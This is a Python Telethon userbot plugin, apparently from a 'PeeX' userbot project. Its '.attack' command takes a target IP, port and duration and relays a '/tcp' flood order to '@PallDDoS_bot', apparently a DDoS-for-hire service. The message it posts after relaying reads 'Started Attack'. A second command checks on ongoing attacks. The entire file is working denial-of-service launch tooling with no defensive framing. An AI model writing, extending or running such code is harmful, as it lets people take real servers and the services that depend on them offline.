# Coded By PeeX Authority 
# Please Join Telegram Channel For Updated
# PeeX - Userbot
# t.me/peexubot
# t.me/peex_ubot
from telethon import events, TelegramClient, utils

TARGET_BOT = '@PallDDoS_bot'

def register(client: TelegramClient):
    @client.on(events.NewMessage(pattern=r'^\.attack (\w+) ([\d\.]+) (\d+) (\d+)$'))
    async def attack_handler(event):
        method, host, port, time = event.pattern_match.groups()
        method = method.lower()
        
        if method == 'tcp':
            command = f"/tcp {host} {port} {time}"
            await client.send_message(TARGET_BOT, command)
            await event.edit(f"🔥 Started Attack On {host}:{port} For {time} 🌟")
        else:
            await event.reply(f"❌ Method `{method}` belum didukung!")
    
    @client.on(events.NewMessage(pattern=r'^\.users ongoing$'))
    async def users_handler(event):
        sent = await client.send_message(TARGET_BOT, "/user ongoing")
        
        @client.on(events.NewMessage(from_users=utils.get_peer_id(TARGET_BOT)))
        async def handler(response):
            await event.edit(response.text)
            client.remove_event_handler(handler, events.NewMessage)
